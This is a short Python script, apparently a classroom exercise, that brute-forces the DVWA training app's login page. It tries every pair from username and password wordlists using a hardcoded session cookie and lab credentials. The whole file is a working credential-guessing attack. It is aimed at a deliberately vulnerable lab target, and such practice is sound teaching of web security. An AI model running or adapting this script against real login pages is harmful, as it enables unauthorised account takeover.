from bs4 import BeautifulSoup
import requests
import hashlib
import time

with open("small-password.txt") as pfile:
    passwords = pfile.readlines()

with open("small-usernames.txt") as ufile:
    users = ufile.readlines()

cookies_jar = requests.cookies.RequestsCookieJar()
cookies_jar.set('PHPSESSID','er8j156t7rn1ccnc7th7dv0ih7')
cookies_jar.set('security','low')

h = hashlib.new('sha256')
for username in users:
    for password in passwords:
        username = username.replace('\r','').replace('\n','')
        password = password.replace('\r', '').replace('\n', '')
        url = 'http://1.2.3.4/DVWA/vulnerabilities/brute/#'
        params = {'username': username,'password': password,'Login': 'Login'}
        r = requests.get(url ,params ,auth=('itp270','itp270'), cookies=cookies_jar, )
        parseHTML = BeautifulSoup(r.text, 'html.parser')
        htmlDiv = parseHTML.find('div',{'class': 'vulnerable_code_area'})

        h.update(r.text.encode())
        print ("trying %s:\n %s: %s - \nhash: %s\n----------\n" % (url, username, password, str(htmlDiv)))
        time.sleep(3)
